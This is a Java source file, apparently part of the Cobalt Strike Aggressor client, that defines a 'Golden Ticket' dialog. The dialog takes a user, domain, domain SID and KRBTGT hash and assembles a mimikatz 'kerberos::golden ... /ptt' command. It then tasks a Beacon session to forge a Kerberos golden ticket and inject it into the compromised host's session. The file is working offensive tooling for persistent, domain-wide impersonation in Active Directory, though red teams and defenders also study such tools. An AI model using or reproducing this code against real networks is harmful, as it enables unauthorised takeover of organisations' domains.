package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.TaskBeacon;
import common.CommonUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class GoldenTicketDialog implements DialogListener {
    protected JFrame dialog = null;
    protected AggressorClient client;
    protected String bid;

    public GoldenTicketDialog(AggressorClient client, String bid) {
        this.client = client;
        this.bid = bid;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        StringBuilder command = new StringBuilder("kerberos::golden /user:");
        command.append(DialogUtils.string(options, "user"));
        command.append(" /domain:");
        command.append(DialogUtils.string(options, "domain"));
        command.append(" /sid:");
        command.append(DialogUtils.string(options, "sid"));
        command.append(" /krbtgt:");
        command.append(DialogUtils.string(options, "hash"));
        command.append(" /endin:480 /renewmax:10080 /ptt");
        TaskBeacon session = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
        DialogUtils.openOrActivate(this.client, this.bid);
        session.input("mimikatz " + command.toString());
        session.MimikatzSmall(command.toString());
        this.client.getConnection().call("armitage.broadcast", CommonUtils.args("goldenticket", options));
    }

    public void show() {
        this.dialog = DialogUtils.dialog("Golden Ticket", 640, 480);
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        controller.set(DataUtils.getGoldenTicket(this.client.getData()));
        controller.text("user", "User:", 20);
        controller.text("domain", "Domain:", 20);
        controller.text("sid", "Domain SID:", 20);
        controller.krbtgt("hash", "KRBTGT Hash:", this.client);
        JButton ok = controller.action("Build");
        JButton help = controller.help("https://www.cobaltstrike.com/help-golden-ticket");
        this.dialog.add(DialogUtils.description("This dialog generates a golden ticket and injects it into the current session."), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(ok, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

